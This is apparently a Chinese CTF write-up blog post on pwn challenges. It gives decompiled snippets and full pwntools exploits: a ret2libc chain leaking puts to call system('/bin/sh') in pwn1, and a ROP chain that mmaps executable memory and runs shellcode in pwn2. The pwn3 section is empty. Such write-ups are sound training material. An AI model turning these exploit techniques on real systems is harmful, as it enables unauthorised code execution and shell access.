---
layout:     post
title:      胡乱做做的部分pwn题
author:     wooy0ung
tags: 		pwn
category:  	writeup
---


>[索引目录]  
>0x001 pwn1  
>0x002 pwn2  
>0x003 pwn3  
<!-- more -->


## 0x001 pwn1

```
v2 = strlen(s);
if ( v2 > 0x7F )
{
puts("Error: input is too long.");
exit(1);
}

...

for ( i = &v11; v3; v3 = *(_BYTE *)(v6 + 1) )
{
while ( v3 != '%' )
{
  *i++ = v3;
  v3 = *++v1;
  if ( !*v1 )
    return printf("Decode Result: %s\n", &v11);
}
v5 = v1[1];
v10 = 0;
nptr = v5;
v9 = v1[2];
*i = strtoul(&nptr, 0, 16);
v6 = (int)(v1 + 2);
++i;
v1 = (char *)(v6 + 1);
}
```

puts函数
```
int puts(char *string)
```

"%" + "\x00" 绕过检查
```
from pwn import *

context.log_level = 'debug'

s = process("./pwn1")
elf = ELF("./pwn1")
libc = ELF("/lib/i386-linux-gnu/libc.so.6")

puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]
main_addr = 0x08048590

p = "http://%\x00" + "1" * (0x9c + 2 -9)
p += p32(puts_plt)
p += p32(main_addr)
p += p32(puts_got)

sleep(0.2)
s.send(p + "\n")

s.recvuntil("http://\n")
data = s.recv(4)
puts_addr = u32(data)
print "puts_addr: [" + hex(puts_addr) + "]"


libc.base = puts_addr - libc.symbols["puts"]
system_addr = libc.symbols["system"] + libc.base
binsh_addr = libc.search("/bin/sh").next() + libc.base

p = "http://%\x00" + "1" * (0x9c + 2 -9)
p += p32(system_addr)
p += p32(main_addr)
p += p32(binsh_addr)

sleep(0.2)
s.send(p + "\n")

s.interactive()
```


## 0x002 pwn2

```
      switch ( v7 )
      {
        case 1:
          adds();
          *(_DWORD *)(v9 + 4LL * i) = dword_6C4A88;
          break;
        case 2:
          subs();
          *(_DWORD *)(v9 + 4LL * i) = dword_6C4AB8;
          break;
        case 3:
          muls("%d");
          *(_DWORD *)(v9 + 4LL * i) = dword_6C4AA8;
          break;
        case 4:
          divs("%d");
          *(_DWORD *)(v9 + 4LL * i) = dword_6C4A98;
          break;
        case 5:
          memcpy(&v6, v9, 4 * v8);
          free(v9);
          return 0;
        default:
          v5 = "Invalid option.\n";
          puts("Invalid option.\n");
          break;
      }

# &v6
-0000000000000040 var_40          db ?
-000000000000003F                 db ? ; undefined
-000000000000003E                 db ? ; undefined
-000000000000003D                 db ? ; undefined
-000000000000003C                 db ? ; undefined
-000000000000003B                 db ? ; undefined
-000000000000003A                 db ? ; undefined
-0000000000000039                 db ? ; undefined
-0000000000000038                 db ? ; undefined
-0000000000000037                 db ? ; undefined
-0000000000000036                 db ? ; undefined
```

mmap函数
```
void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);
[prot] :
#define PROT_READ        0x1                /* Page can be read.  */
#define PROT_WRITE       0x2                /* Page can be written.  */
#define PROT_EXEC        0x4                /* Page can be executed. */
#define PROT_NONE        0x0                /* Page can not be accessed.  */

[flags] :
#define MAP_SHARED        0x01           /* Share changes.  */
#define MAP_PRIVATE       0x02           /* Changes are private.  */
#define MAP_FIXED         0x10           /* Interpret addr exactly.  */
#ifdef __USE_MISC
# define MAP_FILE         0
# ifdef __MAP_ANONYMOUS
#  define MAP_ANONYMOUS   __MAP_ANONYMOUS /* Don't use a file.  */
# else
#  define MAP_ANONYMOUS   0x20            /* Don't use a file.  */
# endif
# define MAP_ANON        MAP_ANONYMOUS
```

调用mmap设置一块新内存执行sh
```
from pwn import *

context.log_level = 'debug'

s = process("./pwn2")
elf = ELF("./pwn2")

def write(con = 0):
    x = 0xffffffff
    y = x - con    # x - y = 0xffffffff - (0xffffffff - con)
    s.readuntil("=> ")
    s.sendline("2")
    s.readuntil("x: ")
    s.sendline(str(x))
    s.readuntil("y: ")
    s.sendline(str(y))
    s.readuntil("=> ")
    s.sendline("2")
    s.readuntil("x: ")
    s.sendline("40")
    s.readuntil("y: ")
    s.sendline("40")


log.info("#--------------------------------create padding")
pause()
s.readuntil("calculations: ")
s.sendline("255")

for i in range(18):
    x = "40"
    y = "40"
    s.readuntil("=>")
    s.sendline("2")
    s.readuntil("x:")
    s.sendline(x)
    s.readuntil("y:")
    s.sendline(y)


log.info("#--------------------------------call mmap(sh_addr, len(sh), 7, 34, 0, 0)")
pause()
read_plt = elf.symbols["read"]
mmap_plt = elf.symbols["mmap"]
rdi = 0x0000000000401b73
rsi = 0x0000000000401c87
rdx = 0x0000000000437a85
rcx = 0x00000000004b8f17
sh_addr = 0xcccccccc
sh = asm(shellcraft.amd64.linux.sh(), arch='amd64')

write(rdi)
write(sh_addr)
write(rsi)
write(len(sh))
write(rdx)
write(7)
write(rcx)
write(34)
write(mmap_plt)


log.info("#--------------------------------call read & getshell")
pause()
write(rdi)
write(0)
write(rsi)
write(sh_addr)
write(rdx)
write(len(sh))
write(read_plt)
write(sh_addr)

s.readuntil("=> ")
s.sendline('5')
s.sendline(sh)
s.interactive()
```


## 0x003 pwn3

